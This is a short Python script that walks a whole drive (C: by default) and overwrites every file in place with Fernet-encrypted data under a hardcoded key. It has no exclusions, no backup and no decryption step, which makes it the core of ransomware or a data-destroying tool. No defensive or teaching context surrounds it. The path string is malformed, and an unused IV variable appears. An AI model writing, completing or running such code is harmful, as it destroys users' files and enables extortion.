import os
import re
from cryptography.fernet import Fernet
# Use your own key and initialization vector (IV) for encryption
key = b'4XL1cmmE6_zgU5uAuFe6ACjN231ZM4duahwXk-kwOt8='
iv = b''
def encrypt_files(folder, exclusions):
    fernet = Fernet(key)
    for path, _, files in os.walk(folder):
        for file in files:
            if any(exclusion in file for exclusion in exclusions):
                continue

            file_path = os.path.join(path, file)
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
# Specify the exclusions for files/file extensions to be skipped during encryption
exclusions = []
# Replace 'C:/' with the appropriate directory path
folder_path = 'C:\"
# Call the encrypt_files function
encrypt_files(folder_path, exclusions)
